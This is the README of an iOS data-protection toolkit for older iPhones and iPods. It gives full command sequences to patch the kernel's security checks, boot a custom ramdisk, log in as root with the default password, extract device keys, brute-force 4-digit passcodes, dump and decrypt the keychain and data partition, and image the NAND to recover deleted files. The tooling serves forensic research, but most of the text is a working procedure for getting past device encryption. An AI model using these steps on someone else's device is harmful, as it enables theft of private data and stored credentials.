iPhone-DataProtection-ToolKit
=============================

Tools  for decrypting and hacking iOS systems

Supported devices
The tools have been tested on :

iPhone 3GS
iPhone 4 GSM
They should work as well on :
iPad 1
iPhone 4 CDMA
iPod touch 2G, 3G & 4G
iPhone 3G
For A5 devices, see issue 49.

A walkthrough for using the tools is available on youtube (thanks to Satish B). Tools are also available to decrypt iTunes Backups.

Requirements
Mercurial to download the tools from the repository
iOS 5.0 IPSW for the target device
even if the target device runs iOS 4 (iOS 5 kernel is backward compatible)
Mac OS X >= 10.6 : for builing the tools and ramdisk
Xcode and iOS SDK 4.x or 5.x. Make sure to install the command line tools
ldid
MacFUSE or OSXFuse
Python 2.7 (or 2.6) : for building a custom kernel and computer-side tools. Python 3 is not supported.
pycrypto
M2crypto
construct
progressbar
redsn0w : for booting the ramdisk
Mac OS X is only required to build the custom ramdisk. Once this is done, Windows can be used to boot the ramdisk and interact with it, either through ssh or using the python scripts provided. Linux is not supported.

Installing dependencies (Mac OS X)
curl -O http://networkpx.googlecode.com/files/ldid
chmod +x ldid
sudo mv ldid /usr/bin/

#fix if unix tools were not installed with xcode
sudo ln -s /Developer/Platforms/iPhoneOS.platform/Developer/usr/bin/codesign_allocate /usr/bin

#create symlink to the new xcode folder
sudo ln -s /Applications/Xcode.App/Contents/Developer /

#install OSXFuse for img3fs
curl -O -L https://github.com/downloads/osxfuse/osxfuse/OSXFUSE-2.3.4.dmg
hdiutil mount OSXFUSE-2.3.4.dmg
sudo installer -pkg /Volumes/FUSE\ for\ OS\ X/Install\ OSXFUSE\ 2.3.pkg -target /
hdiutil eject /Volumes/FUSE\ for\ OS\ X/

#you will need these python modules on Windows as well
sudo easy_install M2crypto construct progressbar setuptools
sudo ARCHFLAGS='-arch i386 -arch x86_64' easy_install pycrypto
Building custom ramdisk & kernel (Mac OS X)
hg clone https://code.google.com/p/iphone-dataprotection/ 
cd iphone-dataprotection

make -C img3fs/

curl -O -L https://sites.google.com/a/iphone-dev.com/files/home/redsn0w_mac_0.9.12b2.zip
unzip redsn0w_mac_0.9.12b2.zip
cp redsn0w_mac_0.9.12b2/redsn0w.app/Contents/MacOS/Keys.plist .

python python_scripts/kernel_patcher.py IOS5_IPSW_FOR_YOUR_DEVICE
    Decrypting kernelcache.release.n88
    Unpacking ...
    Doing CSED patch
    Doing getxattr system patch
    Doing _PE_i_can_has_debugger patch
    Doing IOAESAccelerator enable UID patch
    Doing AMFI patch
    Patched kernel written to kernelcache.release.n88.patched
    Created script make_ramdisk_n88ap.sh, you can use it to (re)build the ramdisk

sh ./make_ramdisk_n88ap.sh
Using the ramdisk
The first step is to boot the ramdisk and custom kernel. This can be done easily on OSX or Windows using redsn0w (follow redsn0w instructions to put the device in DFU mode).

./redsn0w_mac_0.9.12b2/redsn0w.app/Contents/MacOS/redsn0w -i IOS5_IPSW_FOR_YOUR_DEVICE -r myramdisk.dmg -k kernelcache.release.n88.patched
After redsn0w is done, the ramdisk should boot in verbose mode. Once "OK" appears on the screen, the custom ramdisk has successfully started. The device is now accessible using ssh over usbmux. Run the following command (in a separate terminal window) to setup port redirections:

#./tcprelay.sh
python usbmuxd-python-client/tcprelay.py -t 22:2222 1999:1999
SSH is now accessible at localhost:2222.

#if ~/.ssh/id_rsa.pub exists on the host, it was copied to the ramdisk so no password is required.
#otherwise root password is alpine
ssh -p 2222 root@localhost
Port 1999 is used by the demo_bruteforce.py script. It connects to the custom restored_external daemon on the ramdisk, collects basic device information (serial number, UDID, etc.), unique device keys (keys 0x835 and 0x89B), downloads the system keybag and tries to bruteforce the passcode (4 digits only). If the bruteforce is successfull it will also download the keychain database.

python python_scripts/demo_bruteforce.py
The results are stored in a plist file named after the device's data parititon volume identifier (a folder named after the device UDID is also created). This plist file is required for the other python scripts to operate correctly. For instance, the keychain database contents can be displayed using keychain_tool.py.

python python_scripts/keychain_tool.py -d UDID/keychain-2.db UDID/DATAVOLUMEID.plist
A shell script is provided to create a dd image of the data parititon that will be placed in the device UDID directory.

./dump_data_partition.sh
The image file can be opend using the modified HFSExplorer that will decrypt the files "on the fly". To decrypt it permanently (for use with standard tools), the emf_decrypter.py script can be used. Both tools depend on the aforementioned plist file being in the same directory as the disk image.

#do a dry run to avoid crashing halfway
python python_scripts/emf_decrypter.py --nowrite UDID/data_DATE.dmg

#if no errors then decrypt the image in place
python python_scripts/emf_decrypter.py UDID/data_DATE.dmg
Finally, the HFS journal file can be carved to search for deleted files. Keep in mind that only a very few number of files (or even none at all) can be recovered that way.

python python_scripts/emf_undelete.py UDID/data_DATE.dmg
NAND acquisition & deleted files recovery
For NAND access it is recommanded to use the nand-disable boot flag.

./redsn0w_mac_0.9.12b2/redsn0w.app/Contents/MacOS/redsn0w -i IOS5_IPSW_FOR_YOUR_DEVICE -r myramdisk.dmg -k kernelcache.release.n88.patched -a "-v rd=md0 nand-disable=1"
Once the ramdisk is booted, run the ios_examiner script without parameters:

python python_scripts/ios_examiner.py
Connecting to device : 0000000000000000000000000000000000000000
Device model: iPhone 4 GSM
UDID: 0000000000000000000000000000000000000000
ECID: 000000000000
Serial number: 00000000000
key835: 00000000000000000000000000000000
key89B: 00000000000000000000000000000000
Chip id 0x3294e798 banks per CE physical 1
NAND geometry : 16GB (4 CEs (1 physical banks/CE) of 4100 blocks of 128 pages of 8192 bytes data, 12 bytes metdata)
Searching for special pages...
Found DEVICEUNIQUEINFO, NANDDRIVERSIGN, DEVICEINFOBBT special pages in CE 0
NAND signature 0x43313131 flags 0x10006 withening=1, epoch=1
Effaceable generation 204
Effaceable CRC OK
Found effaceable lockers in ce 3 block 1 page 96
Lockers : BAG1, DONE, Dkey, LwVM
Found DEVICEUNIQUEINFO, serial number=00000000000
Using VSVFL
VSVFL context open OK
YaFTL context OK, version=CX01 maxIndexUsn=137419 context usn=137419
LwVM header CRC OK
cprotect version : 4 (iOS 5)
iOS version:  5.1.1
Keybag state: locked
(iPhone4-data) /
At this point you can enter commands in the ios_examiner shell.

(iPhone4-data) / bruteforce
Enter passcode or leave blank for bruteforce:

Passcode "" OK
Keybag state: unlocked
Save device information plist to [0000000000.plist]: iphone4.plist
(iPhone4-data) / nand_dump iphone4_nand.bin
Dumping 16GB NAND to iphone4_nand.bin
100% |########################################################################|
NAND dump time : 0:48:51.799000
SHA1: 0000000000000000000000000000000000000000
(iPhone4-data) / exit
You can then relaunch ios_examiner with the nand image and device plist files as parameters:

python python_scripts/ios_examiner.py iphone4_nand.bin iphone4.plist
Use the "undelete" command to recover deleted files from the nand image. The undelete feature is still experimental but should give better results than the HFS journal carving technique. The "dd" command can be used to extract the data partition as a regular dd image.

ios_examiner commands
system/data: switch between system and data partition
dd filename.dmg: dump current partition to filename.dmg
cd/ls/pwd: browse current partition
open/plist filename: display file
xxd filename [length]: show hexdump
ptable: display partition table
xattr filename: display extended attributes
cprotect filename: display decoded cprotect attribute
protected_files: lists files that use protection classes != NSProtectionNone (files that cannot be accessed without the passcode)
nand_dump nanddump.bin: dumps NAND memory of currently connected device to nanddump.bin
bruteforce: asks for system keybag passcode or tries to bruteforce 4-digit passcodes
keybag: display system keybag state
keychain: display keychain items
undelete: try to recover deleted files (only YaFTL is supported)
img3: extract img3s (NAND-only devices)
reboot: reboot connected device
help: list available commands
FAQ
The following AppleBCMWLANCore error message appears on screen after booting the ramdisk

AppleBCMWLANCore:handleIOKitBusyWatchdogTimout(): Error, no successful firmware download after 60000 ms!! Giving up...
This is normal, Wi-Fi is not initialized when booting the ramdisk environment.

Photorec only recovers existing files, even after running emf_decrypter

Unallocated space cannot be decrypted with emf_decrypter, because each file uses a different encryption key.
